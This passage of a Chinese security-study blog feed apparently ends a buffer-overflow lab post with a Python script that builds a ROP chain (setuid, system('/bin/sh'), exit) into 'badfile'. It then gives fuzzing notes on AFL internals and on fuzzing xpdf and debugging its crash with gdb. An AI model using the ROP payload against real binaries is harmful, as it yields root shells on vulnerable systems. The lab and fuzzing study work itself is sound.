class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>))</span><br><span class="line"></span><br><span class="line">process_code = <span class="number">0x56555000</span></span><br><span class="line">pop_ret_addr = <span class="number">0x1442</span> + process_code <span class="comment"># Gadget A : pop ebx ; ret</span></span><br><span class="line">pop_lea_addr = <span class="number">0x13a5</span> + process_code <span class="comment"># Gadget B : pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0xf7e12420</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span></span><br><span class="line">setuid_addr = <span class="number">0xf7e99e30</span></span><br><span class="line"></span><br><span class="line">main_buffer = <span class="number">0xffffcd10</span> <span class="comment"># here write the Address of input[] inside main():</span></span><br><span class="line">main_buffer_addr = main_buffer+ <span class="number">0x1c</span> + <span class="number">4</span>*<span class="number">5</span></span><br><span class="line"></span><br><span class="line">pay = <span class="number">0xdeedbeef</span></span><br><span class="line">sh_addr = main_buffer + <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">chain = [pop_lea_addr, main_buffer_addr, pay, pay, setuid_addr, pop_ret_addr, <span class="number">0</span>, system_addr, exit_addr, sh_addr]</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x1c</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chain)):</span><br><span class="line">    content[start+i*<span class="number">4</span>: start+i*<span class="number">4</span>+<span class="number">4</span>] = (chain[i]).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content[<span class="number">0x100</span>:<span class="number">0x100</span>+<span class="number">8</span>] = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(content)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> school </category>
          
      </categories>
      
      
        <tags>
            
            <tag> software-security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fuzzing-1-gegeral_knowledge</title>
      <link href="/2022/03/09/fuzzing-1-gegeral-knowledge/"/>
      <url>/2022/03/09/fuzzing-1-gegeral-knowledge/</url>
      
        <content type="html"><![CDATA[<p>fuzz零基础第一课——fuzz关键思想、AFL实现综述</p><span id="more"></span><h1 id="AFL实现阅读笔记"><a href="#AFL实现阅读笔记" class="headerlink" title="AFL实现阅读笔记"></a>AFL实现阅读笔记</h1><h2 id="控制流侦测"><a href="#控制流侦测" class="headerlink" title="控制流侦测"></a>控制流侦测</h2><p>大致了解了一下AFL的实现。AFL的本质还是动态插桩，其插桩的方式是在汇编语言角度上根据控制流形成的一种插桩手法。为此，afl专门使用了自己的编译器<code>afl-gcc/afl-clang</code>以及汇编器<code>afl-as</code>。在使用此编译器之后，插入程序的汇编代码如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">static const u8* trampoline_fmt_32 =</span><br><span class="line"></span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;.align 4\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;leal -16(%%esp), %%esp\n&quot;</span><br><span class="line">  &quot;movl %%edi, 0(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%edx, 4(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%ecx, 8(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%eax, 12(%%esp)\n&quot;</span><br><span class="line">  &quot;movl $0x%08x, %%ecx\n&quot;</span><br><span class="line">  &quot;call __afl_maybe_log\n&quot;</span><br><span class="line">  &quot;movl 12(%%esp), %%eax\n&quot;</span><br><span class="line">  &quot;movl 8(%%esp), %%ecx\n&quot;</span><br><span class="line">  &quot;movl 4(%%esp), %%edx\n&quot;</span><br><span class="line">  &quot;movl 0(%%esp), %%edi\n&quot;</span><br><span class="line">  &quot;leal 16(%%esp), %%esp\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;/* --- END --- */\n&quot;</span><br><span class="line">  &quot;\n&quot;;</span><br></pre></td></tr></table></figure><p>除了保存一些寄存器之外，程序调用了<code>__afl_maybe_log</code>(将在下面说明)。(保存寄存器的地方注意ecx保存了sprintf的参数 R(MAP_SIZE))。这是一个随机数，用来标识程序当前执行到哪个控制块。</p><blockquote><p> 何时调用sprintf呢？网上有文章说是<code>在处理到某个分支，需要插入桩代码时，afl-as会生成一个随机数，作为运行时保存在ecx中的值</code>。但是也没有说清楚什么是分支，以及怎么判断分支。</p></blockquote><p>我觉得这是比较巧妙的。fuzz的实现这里可以理解为基于达到了多少控制流。看到这里也许脑海中已经对fuzz的基本思路有了一个想法。</p><h2 id="fork-server"><a href="#fork-server" class="headerlink" title="fork-server"></a>fork-server</h2><p>可想而知的是fuzzer一定会多次导致程序崩溃，那么必然要执行多次execve操作，这样将很花时间(<a href="https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html">这篇博客</a>有提到)。一个解决办法是使用一个fork-server。因为所有的fork都是写时复制，比较节省调用开销。从而AFL的逻辑是：fuzzer生成一个fork-server，之后在fuzzer和fork-server之间通信。包括fuzzer告知fork-server可以开始fork，以及在fork-server fork子进程运行完毕之后告知fuzzer子进程运行状况。大致的思路是这样。</p><blockquote><p>为什么要这么做?</p><p>我个人认为是想要便于处理。mit6.828里面文件系统部分也是IPC通信，和这个还是比较类似的，甚至更复杂一些。</p></blockquote><h3 id="消息传递"><a href="#消息传递" class="headerlink" title="消息传递?"></a>消息传递?</h3><p>怎样在fork-server和fuzzer之间传递信息呢？阅读源码发现主要是通过一个共享内存的方式传递的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="number">0600</span>);</span><br></pre></td></tr></table></figure><h2 id="分支信息的记录"><a href="#分支信息的记录" class="headerlink" title="分支信息的记录"></a>分支信息的记录</h2><p>具体一点讲，怎么记录fork出来的子进程覆盖了多少代码呢?</p><p>由官网文档可知，AFL是根据二元tuple(跳转的源地址和目标地址)来记录分支信息，从而获取target的执行流程和代码覆盖情况，其伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;</span><br><span class="line">shared_mem[cur_location ^ prev_location]++; </span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>AFL通过写入之前提到的共享内存，作为记录执行了多少分支的依据。从上面的伪代码可以看出，cur_location就是一个随机数，是在控制流侦测中 <code>R(MAP_SIZE)</code>生成的。通过把cur_location和prev_location异或，就能够得到一个能够标志某个分支的key。</p><blockquote><p>AFL为每个代码块生成一个随机数，作为其“位置”的记录；随后，对分支处的”源位置“和”目标位置“进行异或，并将异或的结果作为该分支的key，保存每个分支的执行次数</p></blockquote><p>这里比较迷惑的是为什么要<code>prev_location = cur_location &gt;&gt; 1;</code>文档里面给出的解释是</p><blockquote><p>官方文档中解释了这样做的原因。假设target中存在<code>A-&gt;A</code>和<code>B-&gt;B</code>这样两个跳转，如果不右移，那么这两个分支对应的异或后的key都是0，从而无法区分；另一个例子是<code>A-&gt;B</code>和<code>B-&gt;A</code>，如果不右移，这两个分支对应的异或后的key也是相同的</p></blockquote><p>一开始我还是有疑惑，那不就相当于修改了cur_location为另一个数值了吗，如果A-&gt;B-&gt;C是一个执行流，那么是不是有可能存在一个A-&gt;D-&gt;C的B-&gt;C和D-&gt;C部分碰撞呢?<strong>这里可能是hashmap碰撞检测的部分</strong>。因为只需要B和C不相同就可以了。(那么+1之后也不会相同)</p><p>需要注意到的是，作为目标地址的A和作为起始地址的A可以理解为带有不同的信息，因此**+1影响到地址改变只是一种错觉**。</p><p>看一下完整的源码，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&quot;__afl_store:\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot; /* Calculate and store hit for the code location specified in ecx. There\n&quot;</span><br><span class="line">  &quot; is a double-XOR way of doing this without tainting another register,\n&quot;</span><br><span class="line">  &quot; and we use it on 64-bit systems; but it&#x27;s slower for 32-bit ones. */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">#ifndef COVERAGE_ONLY</span><br><span class="line"></span><br><span class="line">  &quot; movl __afl_prev_loc, %edi\n&quot;</span><br><span class="line">  &quot; xorl %ecx, %edi\n&quot;</span><br><span class="line">  &quot; shrl $1, %ecx\n&quot;</span><br><span class="line">  &quot; movl %ecx, __afl_prev_loc\n&quot;</span><br><span class="line">#else</span><br><span class="line"></span><br><span class="line">  &quot; movl %ecx, %edi\n&quot;</span><br><span class="line">#endif /* ^!COVERAGE_ONLY */</span><br><span class="line"></span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">#ifdef SKIP_COUNTS</span><br><span class="line"></span><br><span class="line">  &quot; orb $1, (%edx, %edi, 1)\n&quot;</span><br><span class="line">#else</span><br><span class="line"></span><br><span class="line">  &quot; incb (%edx, %edi, 1)\n&quot;</span><br></pre></td></tr></table></figure><h2 id="分支信息的处理"><a href="#分支信息的处理" class="headerlink" title="分支信息的处理"></a>分支信息的处理</h2><p>在fuzzer接收到fork-server发出的共享内存信息之后(回想一下，共享内存是什么：是一个hashmap，记录了每个<strong>路径</strong>执行的次数。)fuzzer自然不能将这些信息全部存起来，需要进行一些处理并分析。目的之一肯定是压缩信息(不然每次共享内存无法得到回收，开销太大)以下就是fuzzer处理分支信息的方式。</p><p>借助于上面提到的某个分支的hash值，我们可以简单地用一个桶结构记录某个路径被执行了多少次。这样的好处是，对于一些比较细小差别的执行次数(例如A分支执行了10次，B执行了11次)就把他们归为一类。之后将所有的分支桶中的代码块标志hash一下，变成当前执行结果的输出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> u8 count_class_lookup8[<span class="number">256</span>] = &#123;</span><br><span class="line"></span><br><span class="line">  [<span class="number">0</span>]           = <span class="number">0</span>, </span><br><span class="line">  [<span class="number">1</span>]           = <span class="number">1</span>, </span><br><span class="line">  [<span class="number">2</span>]           = <span class="number">2</span>, </span><br><span class="line">  [<span class="number">3</span>]           = <span class="number">4</span>, </span><br><span class="line">  [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">8</span>, </span><br><span class="line">  [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">16</span>,</span><br><span class="line">  [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">32</span>,</span><br><span class="line">  [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">64</span>,</span><br><span class="line">  [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>举个例子，如果某分支执行了1次，那么落入第2个bucket，其计数byte仍为1；如果某分支执行了4次，那么落入第5个bucket，其计数byte将变为8，等等。fuzzer对fork-server传回的共享内存作上述处理之后，将一次结果保存下来。之后继续进行下一次的fuzz。</p><p>通过把稀疏的map结构转变为桶结构，能够压缩一定的空间。</p><h2 id="文件变异"><a href="#文件变异" class="headerlink" title="文件变异"></a>文件变异</h2><p>AFL提供的主要的文件变异种类有以下几种</p><blockquote><ul><li>bitflip，按位翻转，1变为0，0变为1</li><li>arithmetic，整数加/减算术运算</li><li>interest，把一些特殊内容替换到原文件中</li><li>dictionary，把自动生成或用户提供的token替换/插入到原文件中</li><li>havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异，具体见下文</li><li>splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件</li></ul></blockquote><p>这些变异方法也不是随机变的，例如bitflip中，AFL可以通过每一字节、两字节、四字节、八字节的方法改变文件中的比特串，从而识别出哪些比特串是<code>tag</code>(也就是文件标识符，例如ELF文件开头的ELF)，又比如进行一个byte级别的反转时，如果执行路径没有发生变化，那么说明这个byte很有可能属于data部分，而不是”metadata”。因此这样变化带来的意义就不大，从而后面多个byte的变异就可以跳过这些byte。</p><p>这里另外一个比较有意思的地方是<code>havoc</code>大破坏，它确实能造成很大的破坏。具体来说，havoc包含了对原文件的多轮变异，每一轮都是将多种方式组合（stacked）而成：</p><blockquote><ul><li>随机选取某个bit进行翻转</li><li>随机选取某个byte，将其设置为随机的interesting value</li><li>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个byte，对其减去一个随机数</li><li>随机选取某个byte，对其加上一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个byte，将其设置为随机数</li><li>随机删除一段bytes</li><li>随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</li><li>随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</li></ul></blockquote><p>此外，interest这里还会给出一些常见的特殊data，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* List of interesting values to use in fuzzing. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERESTING_8 \</span></span><br><span class="line"><span class="meta">  -128,          <span class="comment">/* Overflow signed 8-bit when decremented  */</span> \</span></span><br><span class="line"><span class="meta">  -1,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   0,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   1,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   16,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   32,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   64,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   100,          <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   127           <span class="comment">/* Overflow signed 8-bit when incremented  */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERESTING_16 \</span></span><br><span class="line"><span class="meta">  -32768,        <span class="comment">/* Overflow signed 16-bit when decremented */</span> \</span></span><br><span class="line"><span class="meta">  -129,          <span class="comment">/* Overflow signed 8-bit                   */</span> \</span></span><br><span class="line"><span class="meta">   128,          <span class="comment">/* Overflow signed 8-bit                   */</span> \</span></span><br><span class="line"><span class="meta">   255,          <span class="comment">/* Overflow unsig 8-bit when incremented   */</span> \</span></span><br><span class="line"><span class="meta">   256,          <span class="comment">/* Overflow unsig 8-bit                    */</span> \</span></span><br><span class="line"><span class="meta">   512,          <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   1000,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   1024,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   4096,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   32767         <span class="comment">/* Overflow signed 16-bit when incremented */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERESTING_32 \</span></span><br><span class="line"><span class="meta">  -2147483648LL, <span class="comment">/* Overflow signed 32-bit when decremented */</span> \</span></span><br><span class="line"><span class="meta">  -100663046,    <span class="comment">/* Large negative number (endian-agnostic) */</span> \</span></span><br><span class="line"><span class="meta">  -32769,        <span class="comment">/* Overflow signed 16-bit                  */</span> \</span></span><br><span class="line"><span class="meta">   32768,        <span class="comment">/* Overflow signed 16-bit                  */</span> \</span></span><br><span class="line"><span class="meta">   65535,        <span class="comment">/* Overflow unsig 16-bit when incremented  */</span> \</span></span><br><span class="line"><span class="meta">   65536,        <span class="comment">/* Overflow unsig 16 bit                   */</span> \</span></span><br><span class="line"><span class="meta">   100663045,    <span class="comment">/* Large positive number (endian-agnostic) */</span> \</span></span><br><span class="line"><span class="meta">   2147483647    <span class="comment">/* Overflow signed 32-bit when incremented */</span></span></span><br></pre></td></tr></table></figure><p>这些都是容易导致出现bug的字符。</p><p>还有一些别的，<a href="https://paper.seebug.org/496/#_4">这篇文章</a>讲的灰常清楚，我这里就不重复了。至此应该对AFL的基本实现有一定的了解。</p><h1 id="afl-fuzz环境配置"><a href="#afl-fuzz环境配置" class="headerlink" title="afl-fuzz环境配置"></a>afl-fuzz环境配置</h1><p>不得不说环境配置真是搞人心态。我总共前前后后花了大概三天时间。一开始看fuzzing010讲的是用gcc的，但是无论如何耶不行，一直出现not instrumented标记，上网查也没找到解决方法。所以下定决心看一看AFL官网配置文件中的，不走捷径。</p><p>不看不知道，官网中说明白了，编译器的选择是llvm比gcc好。于是我后面选择的都是llvm。</p><h2 id="安装llvm"><a href="#安装llvm" class="headerlink" title="安装llvm"></a>安装llvm</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">echo deb http://apt.llvm.org/NAME/ llvm-toolchain-NAME NAME &gt;&gt; /etc/apt/sources.list</span><br><span class="line">wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | apt-key add -</span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade -y</span><br><span class="line">apt-get install -y clang-12 clang-tools-12 libc++1-12 libc++-12-dev \</span><br><span class="line">    libc++abi1-12 libc++abi-12-dev libclang1-12 libclang-12-dev \</span><br><span class="line">    libclang-common-12-dev libclang-cpp12 libclang-cpp12-dev liblld-12 \</span><br><span class="line">    liblld-12-dev liblldb-12 liblldb-12-dev libllvm12 libomp-12-dev \</span><br><span class="line">    libomp5-12 lld-12 lldb-12 llvm-12 llvm-12-dev llvm-12-runtime llvm-12-tools</span><br><span class="line">apt-get install llvm-5.0</span><br></pre></td></tr></table></figure><h2 id="编译二进制文件时插桩"><a href="#编译二进制文件时插桩" class="headerlink" title="编译二进制文件时插桩"></a>编译二进制文件时插桩</h2><p>从上面的分析中可以看到AFL的原理其实就是在编译时插桩，从而记录各种各样的代码块执行情况。我们用以下命令控制编译文件的方式(使用afl-clang-lto以及afl-clang-lto++)。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CC=afl-clang-lto CXX=afl-clang-lto++ RANLIB=llvm-ranlib AR=llvm-ar ./configure</span><br></pre></td></tr></table></figure><p>如果一切正常，终端**不会显示”C compiler cannot create executables”**。一旦显示说明当前编译器选择不正确。最好检查上面安装llvm过程是否出现了问题。</p><h2 id="使用llvm进行fuzz"><a href="#使用llvm进行fuzz" class="headerlink" title="使用llvm进行fuzz"></a>使用llvm进行fuzz</h2><p>这里采用的是fuzzing010的命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output</span><br></pre></td></tr></table></figure><p>这句话是什么意思呢?</p><blockquote><ul><li><em>-i</em> indicates the directory where we have to put the input cases (a.k.a file examples)</li><li><em>-o</em> indicates the directory where AFL++ will store the mutated files</li><li><em>-s</em> indicates the static random seed to use</li><li><em>@@</em> is the placeholder target’s command line that AFL will substitute with each input file name</li></ul></blockquote><p>正常情况下，执行后会得到这样的输出。</p><p><img src="/2022/03/09/fuzzing-1-gegeral-knowledge/image-20220312194235177.png" alt="image-20220312194235177"></p><h1 id="分析crash"><a href="#分析crash" class="headerlink" title="分析crash"></a>分析crash</h1><p>作为ics的学习经验，一开始尝试做lab出发点是好的，但是结果一般还是得看别人的解答。但是我头比较铁。</p><p>选择crash里面第一个来分析，输出这些内容，使用gdb尝试调试</p><p><img src="/2022/03/09/fuzzing-1-gegeral-knowledge/image-20220312215055637.png" alt="image-20220312215055637"></p><p>想要用gdb传入参数，使用以下命令（注意到pdfinfo在install/bin文件夹下，这里先进入文件夹）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ./pdfinfo --args ../../out/default/crashes/id:000001,sig:11,src:001598,time:460946,execs:312004,op:havoc,rep:2.txt</span><br></pre></td></tr></table></figure><p>好像输出不太对?</p><p><img src="/2022/03/09/fuzzing-1-gegeral-knowledge/image-20220312220623934.png" alt="image-20220312220623934"></p><p>投降，去看看答案怎么写(毕竟是第一次做，不知道怎么做很正常，蒽)</p><p>答案说的crash里面是有segmentation fault的，但是我的没有??(可能这个就是unique crash吗)。上网查了一下，发现输出的crash里面其实有信号类型。(可以看到下面sig:11的位置)</p><p><img src="/2022/03/09/fuzzing-1-gegeral-knowledge/image-20220312225515617.png" alt="image-20220312225515617"></p><p>在<a href="https://zh.wikipedia.org/wiki/Unix%E4%BF%A1%E5%8F%B7">wiki</a>上面查到，11对应的错误就是segmentation fault?</p><p><img src="/2022/03/09/fuzzing-1-gegeral-knowledge/image-20220312225618505.png" alt="image-20220312225618505"></p><p>查了一下<code>unique_crash</code>是什么。指的是和当前crash相关的程序执行流没有在之前的crash情况中碰到过。那会不会是我AFL配置的有问题?(回想起来我是用LLVM编译的)</p><p><img src="/2022/03/09/fuzzing-1-gegeral-knowledge/image-20220312225830866.png" alt="image-20220312225830866"></p><p>经过各种尝试，终于分析到结果了。如下所示。之前没有下载一张helloworld.pdf的托i按，现在下载下来就有了(只能说样本对于fuzz关系很微妙啊)</p><h2 id="调试样本"><a href="#调试样本" class="headerlink" title="调试样本"></a>调试样本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ~/fuzzing_xpdf/install/<span class="built_in">bin</span>/pdftotext</span><br><span class="line"><span class="built_in">set</span> args ./<span class="built_in">id</span>:<span class="number">000000</span>,sig:<span class="number">11</span>,src:001467,time:<span class="number">492166</span>,execs:<span class="number">256801</span>,op:havoc,rep:<span class="number">8</span></span><br></pre></td></tr></table></figure><p>以上语句设置gdb的路径以及参数。这里我和答案做法不一样，答案还带符号编译了一下，但是我就用llvm编译的结果就是有符号的。</p><p>运行之后结果如下</p><p><img src="/2022/03/09/fuzzing-1-gegeral-knowledge/image-20220313082846650.png" alt="image-20220313082846650"></p><p>使用backtrace或者bt可以看到以下内容</p><p><img src="/2022/03/09/fuzzing-1-gegeral-knowledge/image-20220313002543874.png" alt="image-20220313002543874"></p><p>可以看到程序递归调用了<code>parser::getObj</code>这里的函数，导致出现了爆栈。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11</span> <span class="number">0x0000000000321116</span> <span class="keyword">in</span> XRef::fetch (this=&lt;optimized out&gt;, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffff7ff748</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line"><span class="number">12</span> <span class="number">0x00000000002ed608</span> <span class="keyword">in</span> Parser::getObj (this=<span class="number">0x1dad260</span>, obj=<span class="number">0x7fffff7ff8e8</span>, fileKey=&lt;optimized out&gt;, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Object.cc:<span class="number">106</span></span><br><span class="line"><span class="number">13</span> <span class="number">0x0000000000321116</span> <span class="keyword">in</span> XRef::fetch (this=&lt;optimized out&gt;, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffff7ff8e8</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line"><span class="number">14</span> <span class="number">0x00000000002ed608</span> <span class="keyword">in</span> Parser::getObj (this=<span class="number">0x1dacd80</span>, obj=<span class="number">0x7fffff7ffa88</span>, fileKey=&lt;optimized out&gt;, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Object.cc:<span class="number">106</span></span><br><span class="line"><span class="number">15</span> <span class="number">0x0000000000321116</span> <span class="keyword">in</span> XRef::fetch (this=&lt;optimized out&gt;, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffff7ffa88</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line"><span class="number">16</span> <span class="number">0x00000000002ed608</span> <span class="keyword">in</span> Parser::getObj (this=<span class="number">0x1dac8a0</span>, obj=<span class="number">0x7fffff7ffc28</span>, fileKey=&lt;optimized out&gt;, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Object.cc:<span class="number">106</span></span><br><span class="line"><span class="number">17</span> <span class="number">0x0000000000321116</span> <span class="keyword">in</span> XRef::fetch (this=&lt;optimized out&gt;, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffff7ffc28</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line"><span class="number">18</span> <span class="number">0x00000000002ed608</span> <span class="keyword">in</span> Parser::getObj (this=<span class="number">0x1dac3c0</span>, obj=<span class="number">0x7fffff7ffdc8</span>, fileKey=&lt;optimized out&gt;, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Object.cc:<span class="number">106</span></span><br><span class="line"><span class="number">19</span> <span class="number">0x0000000000321116</span> <span 